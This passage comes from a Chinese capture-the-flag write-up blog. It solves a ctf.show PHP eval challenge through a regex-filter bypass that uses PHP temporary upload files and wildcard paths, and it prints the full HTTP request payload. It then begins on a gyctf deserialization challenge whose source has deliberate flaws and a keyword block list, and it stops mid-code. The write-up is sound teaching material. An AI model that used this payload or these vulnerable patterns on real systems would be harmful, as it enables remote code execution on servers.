data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h4</span><span class=\"token punctuation\">&gt;</span></span>where is the flag?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h4</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">&lt;!-- hint:?cmd= --&gt;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-oq-z0-9$]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cerror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\~|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\{|\\}|\\[|\\]|\\'|\\\"|\\:|\\,/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"serror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>     <span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>在 php 中，使用 <code>Content-Type: multipart/form-data;</code>  上传文件时，会将它保存在临时文件中，在 php 的配置中 <code>upload_tmp_dir</code>  参数为保存临时文件的路经，linux 下面默认为 <code>/tmp</code> 。也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且 php 每次创建的临时文件名都有固定的格式，为 <code>phpXXXX.tmp</code> （Windows 中）、 <code>php**.tmp</code> （Linux 中）。</p>\n<p>思路就是上传文件生成临时文件，将真正想要执行的函数放到临时文件中，然后利用 <code>eval</code>  函数进行执行临时文件。<br>\n然后再看 cmd 这里有两个过滤，过滤了除 p 以外的所有字母数字，可用的特殊字符为 <code>. ? /</code>  等。在 linux 中， <code>source</code>  命令和 <code>.</code>  相同，用于从当前 shell 会话中读取文件和执行命令。<br>\n在 php 中，命令执行方式有：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>system ('ls')</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>echo ('ls')</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo ls</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;?= 等价于 &lt;?php echo</pre></td></tr></tbody></table></figure><p>因为  <code>&lt;?=</code>  没有被过滤，所以就可以用 <code>?&gt;&lt;?=</code>  来传递命令执行临时文件的内容，构造的语句为 <code>?&gt;&lt;?= .+/??p/p?p??????; ， ?&gt; </code> 为了闭合之前的 php 语句，后面为执行命令的语句， <code>+</code>  在 url 中表示空格，利用？通配符匹配到 <code>/tmp/php**.tmp</code>  文件。<br>\n最终构造的 payload 为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Host: 11b1397e-2020-484b-a7d3-484f22d4935b.challenge.ctf.show</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Accept-Encoding: gzip, deflate</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Connection: keep-alive</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Content-Length: 242</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-----------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Content-Disposition: form-data; name=\"fileUpload\"; filename=\"1.txt\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Content-Type: text/plain</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>#! /bin/bash</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>cat /flag.txt</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>-----------------------------10242300956292313528205888--</pre></td></tr></tbody></table></figure><h1 id=\"game-gyctf-web2\"><a class=\"anchor\" href=\"#game-gyctf-web2\">#</a> game-gyctf web2</h1>\n<p>该题主要考察的时 php 反序列化和反序列化字符串逃逸</p>\n<p>首先，扫描出 <code>www.zip</code>  可以看到源码，分别为</p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string double-quoted-string\">\"lib.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__DIR__</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>lib.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$array</span><span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'union'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'regexp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'into'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'insert'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"alter\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token operator\">=</span><span class=\"token variable\">$mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select id,password from user where username=?'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你的ID是\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你好！\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$Info</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getNewinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token variable\">$updateAction</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Info</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"update user SET age=<span class=\"token interpolation\"><span class=\"token variable\">$age</span></span>,nickname=<span class=\"token interpolation\"><span class=\"token variable\">$nickname</span></span> where id=\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// 这个功能还没有写完 先占坑</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getNewInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'age'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'nickname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Info</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 危</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"0-0\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Info</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$CtrlCase</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">age</span><span class=\"token operator\">=</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">}</span>   </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">CtrlCase</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$argument</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">Class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$newinfo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token variable\">$newInfo</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token variable\">$upDate</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token 